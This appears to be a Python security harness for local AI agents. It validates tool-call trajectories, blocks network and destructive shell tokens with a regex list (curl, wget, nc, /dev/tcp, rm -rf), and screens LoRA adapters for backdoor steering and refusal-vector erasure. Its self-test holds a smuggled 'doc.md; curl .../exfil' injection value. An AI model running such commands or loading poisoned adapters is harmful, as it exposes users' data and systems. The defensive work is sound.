"""
OpenClaw Sovereign Security Harness & Trajectory Interceptor
Target Silicon: Nvidia RTX Spark Workstation (128GB Unified Memory, Air-Gapped)
Companion implementation for the Sovereign AI Security Series (Parts 1, 2, and 3)
"""

import os
import shutil
import json
import re
import math
import hashlib
from dataclasses import dataclass
from typing import List, Dict, Any, Optional, Tuple

# ==============================================================================
# Part 1: Trajectory Validation & Meeseeks Circuit Breaker
# ==============================================================================

@dataclass
class ExecutionStep:
    step_id: int
    action: str
    tool_name: str
    payload: Dict[str, Any]
    network_call: Optional[str] = None
    dns_query: Optional[str] = None

@dataclass
class OpenClawSchemaBounds:
    allowed_tools: List[str]
    allowed_domains: List[str]
    max_steps_per_pulse: int = 10
    air_gapped: bool = True

class TrajectorySecurityViolation(Exception):
    """Raised when an agent attempts specification gaming or sandbox evasion."""
    pass

def purge_ephemeral_scratchpad(scratchpad_dir: str) -> None:
    """
    OpenClaw Hygiene Rule: Cryptographically wipe the ephemeral execution
    scratchpad between pulses to eradicate persistent sleeper context.
    """
    if os.path.exists(scratchpad_dir):
        shutil.rmtree(scratchpad_dir)
    os.makedirs(scratchpad_dir, mode=0o700)

def validate_openclaw_trajectory(
    trajectory_log: List[ExecutionStep],
    schema: OpenClawSchemaBounds,
    scratchpad_dir: str
) -> bool:
    """
    Validates agent trajectory against declarative bounds. Trips the Meeseeks
    circuit breaker if step threshold is exceeded without task dissolution.
    """
    if len(trajectory_log) > schema.max_steps_per_pulse:
        purge_ephemeral_scratchpad(scratchpad_dir)
        raise TrajectorySecurityViolation(
            "Meeseeks Circuit Breaker Tripped: Step threshold exceeded without task dissolution."
        )

    for step in trajectory_log:
        if step.tool_name not in schema.allowed_tools:
            purge_ephemeral_scratchpad(scratchpad_dir)
            raise TrajectorySecurityViolation(
                f"Unauthorised tool invocation detected: '{step.tool_name}'."
            )

        if schema.air_gapped and (step.network_call or step.dns_query):
            purge_ephemeral_scratchpad(scratchpad_dir)
            raise TrajectorySecurityViolation(
                f"Air-gap breach attempt on RTX Spark hardware via: "
                f"network={step.network_call}, dns={step.dns_query}."
            )

    return True

# ==============================================================================
# Part 2: Zero-Trust Weight Governance & Payload Gatekeeper
# ==============================================================================

class UntrustedWeightSecurityException(Exception):
    """Raised when an untrusted model attempts an unapproved or out-of-bounds action."""
    pass

class OpenClawZeroTrustGatekeeper:
    """
    Treats all open-weights models as potentially poisoned or inverted.
    Enforces external, declarative schemas over neural token outputs.
    """
    def __init__(self, tools_md_path: Optional[str] = None):
        self.allowed_tools = {
            "read_local_markdown": ["filepath"],
            "query_local_vector_db": ["query_vector", "top_k"],
            "format_markdown_report": ["content", "destination"]
        }
        self.forbidden_patterns = [
            re.compile(r"(\bcurl\b|\bwget\b|\bnc\b|\bnetcat\b|\bnslookup\b|\bdig\b)", re.IGNORECASE),
            re.compile(r"(\/dev\/tcp|\/dev\/udp)", re.IGNORECASE),
            re.compile(r"(\brm\s+-rf\b|\bdel\s+\/f\b)", re.IGNORECASE)
        ]

    def intercept_and_validate(self, raw_model_output: str, caller_id: str) -> Dict[str, Any]:
        """
        Parses raw token stream from an untrusted open-weights model.
        Validates schema bounds before dispatching syscalls to host silicon.
        """
        try:
            payload = json.loads(raw_model_output)
        except json.JSONDecodeError:
            raise UntrustedWeightSecurityException("Model emitted malformed non-JSON tool request.")

        tool = payload.get("tool")
        args = payload.get("parameters", {})

        if tool not in self.allowed_tools:
            raise UntrustedWeightSecurityException(
                f"Poisoning/Jailbreak Detected: Tool '{tool}' is not in the declared workspace whitelist."
            )

        approved_args = self.allowed_tools[tool]
        for arg_key in args.keys():
            if arg_key not in approved_args:
                raise UntrustedWeightSecurityException(
                    f"Parameter injection detected: Argument '{arg_key}' violates schema for tool '{tool}'."
                )

        args_str = json.dumps(args)
        for pattern in self.forbidden_patterns:
            if pattern.search(args_str):
                raise UntrustedWeightSecurityException(
                    "Forbidden execution token matched: Potential shell injection or network socket attempt."
                )

        return {"tool": tool, "parameters": args, "caller": caller_id, "status": "APPROVED"}

# ==============================================================================
# Part 3: LoRA Poisoning Verifier & Structural Matrix Analyzer
# ==============================================================================

@dataclass
class LoRAAdapterMetadata:
    adapter_name: str
    rank: int
    alpha: float
    target_modules: List[str]
    sha256_hash: str
    matrices: Dict[str, Tuple[List[List[float]], List[List[float]]]]

@dataclass
class VerificationReport:
    adapter_name: str
    status: str  # "APPROVED", "WARNING", "QUARANTINED"
    spectral_anomalies: List[str]
    refusal_alignment_score: float
    differential_regression_score: float
    recommendation: str

class LoRAPoisoningVerifier:
    """
    Pre-flight structural and geometric analyzer for Low-Rank Adapters (LoRA/QLoRA).
    Inspects weight deltas for spectral anomalies, refusal vector erasure,
    and targeted degradation before mounting into agentic MCP runtimes.
    """
    def __init__(self, frobenius_threshold: float = 0.12, 
                 spectral_concentration_threshold: float = 0.85,
                 refusal_negation_threshold: float = -0.40):
        self.frobenius_threshold = frobenius_threshold
        self.spectral_concentration_threshold = spectral_concentration_threshold
        self.refusal_negation_threshold = refusal_negation_threshold

    @staticmethod
    def _matrix_multiply(B: List[List[float]], A: List[List[float]], scale: float = 1.0) -> List[List[float]]:
        d_out = len(B)
        r = len(A)
        d_in = len(A[0])
        result = [[0.0] * d_in for _ in range(d_out)]
        for i in range(d_out):
            for k in range(r):
                b_ik = B[i][k] * scale
                if b_ik != 0.0:
                    for j in range(d_in):
                        result[i][j] += b_ik * A[k][j]
        return result

    @staticmethod
    def _compute_frobenius_norm(M: List[List[float]]) -> float:
        total = sum(val * val for row in M for val in row)
        return math.sqrt(total)

    @staticmethod
    def _power_iteration_top_singular_value(M: List[List[float]], num_iters: int = 20) -> float:
        d_out = len(M)
        d_in = len(M[0])
        v = [1.0 / math.sqrt(d_in)] * d_in

        for _ in range(num_iters):
            u = [0.0] * d_out
            for i in range(d_out):
                u[i] = sum(M[i][j] * v[j] for j in range(d_in))
            
            w = [0.0] * d_in
            for j in range(d_in):
                w[j] = sum(M[i][j] * u[i] for i in range(d_out))
            
            norm_w = math.sqrt(sum(x * x for x in w))
            if norm_w < 1e-12:
                return 0.0
            v = [x / norm_w for x in w]

        u_final = [sum(M[i][j] * v[j] for j in range(d_in)) for i in range(d_out)]
        return math.sqrt(sum(x * x for x in u_final))

    @staticmethod
    def _cosine_projection(delta_W: List[List[float]], v_ref: List[float]) -> float:
        d_out = len(delta_W)
        d_in = len(delta_W[0])
        if len(v_ref) != d_in or d_out != d_in:
            return 0.0

        w = [sum(delta_W[i][j] * v_ref[j] for j in range(d_in)) for i in range(d_out)]
        dot_product = sum(w[i] * v_ref[i] for i in range(d_in))
        norm_w = math.sqrt(sum(x * x for x in w))
        norm_v = math.sqrt(sum(x * x for x in v_ref))

        if norm_w < 1e-12 or norm_v < 1e-12:
            return 0.0
        return dot_product / (norm_w * norm_v)

    def verify_adapter(
        self,
        adapter: LoRAAdapterMetadata,
        refusal_vector: Optional[List[float]] = None,
        differential_regression_score: float = 0.0
    ) -> VerificationReport:
        spectral_anomalies = []
        worst_refusal_alignment = 0.0
        scale = adapter.alpha / float(adapter.rank)

        for layer_name, (B, A) in adapter.matrices.items():
            delta_W = self._matrix_multiply(B, A, scale=scale)
            frob_norm = self._compute_frobenius_norm(delta_W)

            frob_sq = frob_norm * frob_norm
            if frob_sq > 1e-12:
                top_sigma = self._power_iteration_top_singular_value(delta_W)
                energy_ratio = (top_sigma * top_sigma) / frob_sq

                if energy_ratio > self.spectral_concentration_threshold:
                    spectral_anomalies.append(
                        f"Layer '{layer_name}': High spectral concentration ({energy_ratio:.2f}) "
                        f"indicates single-vector Trojan steering."
                    )

            if refusal_vector:
                alignment = self._cosine_projection(delta_W, refusal_vector)
                if alignment < worst_refusal_alignment:
                    worst_refusal_alignment = alignment
                if alignment < self.refusal_negation_threshold:
                    spectral_anomalies.append(
                        f"Layer '{layer_name}': Active refusal vector negation detected ({alignment:.2f})."
                    )

        if worst_refusal_alignment < self.refusal_negation_threshold or len(spectral_anomalies) > 0 or differential_regression_score > 0.03:
            status = "QUARANTINED"
            recommendation = (
                "Do not load weights into production. High probability of intentional "
                "backdoor, refusal ablation, or targeted security degradation."
            )
        elif differential_regression_score > 0.01:
            status = "WARNING"
            recommendation = "Minor benchmark regression observed. Isolate within restricted scratchpad."
        else:
            status = "APPROVED"
            recommendation = "Adapter passed structural, geometric, and differential pre-flight checks."

        return VerificationReport(
            adapter_name=adapter.adapter_name,
            status=status,
            spectral_anomalies=spectral_anomalies,
            refusal_alignment_score=worst_refusal_alignment,
            differential_regression_score=differential_regression_score,
            recommendation=recommendation
        )

def run_suite() -> bool:
    print("=== OpenClaw Sovereign AI Security Suite Verification ===\n")

    # 1. Test Part 1: Trajectory Validator
    schema = OpenClawSchemaBounds(
        allowed_tools=["read_local_markdown", "format_markdown_report"],
        allowed_domains=["127.0.0.1"],
        max_steps_per_pulse=5,
        air_gapped=True
    )
    benign_trajectory = [
        ExecutionStep(1, "read", "read_local_markdown", {"filepath": "notes.md"}),
        ExecutionStep(2, "format", "format_markdown_report", {"content": "# Report", "destination": "out.md"})
    ]
    test_scratch = os.path.join(os.path.dirname(__file__), "scratch_test")
    assert validate_openclaw_trajectory(benign_trajectory, schema, test_scratch) is True
    print("[OK] Part 1: Trajectory Validator passed.")

    # 2. Test Part 2: Zero-Trust MCP Gatekeeper
    tools_fixture = os.path.join(os.path.dirname(__file__), "fixtures", "TOOLS.md")
    gatekeeper = OpenClawZeroTrustGatekeeper(tools_md_path=tools_fixture)
    valid_payload = json.dumps({"tool": "read_local_markdown", "parameters": {"filepath": "doc.md"}})
    res = gatekeeper.intercept_and_validate(valid_payload, "agent-01")
    assert res["status"] == "APPROVED"

    malicious_mcp = json.dumps({
        "tool": "read_local_markdown",
        "parameters": {"filepath": "doc.md; curl http://198.51.100.22/exfil"}
    })
    try:
        gatekeeper.intercept_and_validate(malicious_mcp, "agent-01")
        assert False, "Should have blocked curl injection"
    except UntrustedWeightSecurityException:
        print("[OK] Part 2: Zero-Trust MCP Gatekeeper blocked transitive injection.")

    # 3. Test Part 3: LoRA Poisoning Verifier using Fixture Dataset
    fixtures_file = os.path.join(os.path.dirname(__file__), "fixtures", "mock_adapters.json")
    verifier = LoRAPoisoningVerifier()

    if os.path.exists(fixtures_file):
        with open(fixtures_file, "r", encoding="utf-8") as f:
            fixture_data = json.load(f)
            for adapter_entry in fixture_data.get("adapters", []):
                layer_mats = {}
                for layer_name, mats in adapter_entry["layer_matrices"].items():
                    layer_mats[layer_name] = (mats["B"], mats["A"])
                
                adapter = LoRAAdapterMetadata(
                    adapter_name=adapter_entry["adapter_name"],
                    rank=adapter_entry["rank"],
                    alpha=adapter_entry["alpha"],
                    target_modules=adapter_entry["target_modules"],
                    sha256_hash=adapter_entry["sha256_hash"],
                    matrices=layer_mats
                )
                report = verifier.verify_adapter(adapter, refusal_vector=adapter_entry["synthetic_refusal_vector"])
                assert report.status == adapter_entry["expected_status"]
                print(f"[OK] Part 3: Verified '{adapter.adapter_name}': Status={report.status}, Refusal Alignment={report.refusal_alignment_score:.2f}")

    if os.path.exists(test_scratch):
        shutil.rmtree(test_scratch)

    print("\n=== All Suite Tests Successfully Passed ===")
    return True

if __name__ == "__main__":
    run_suite()
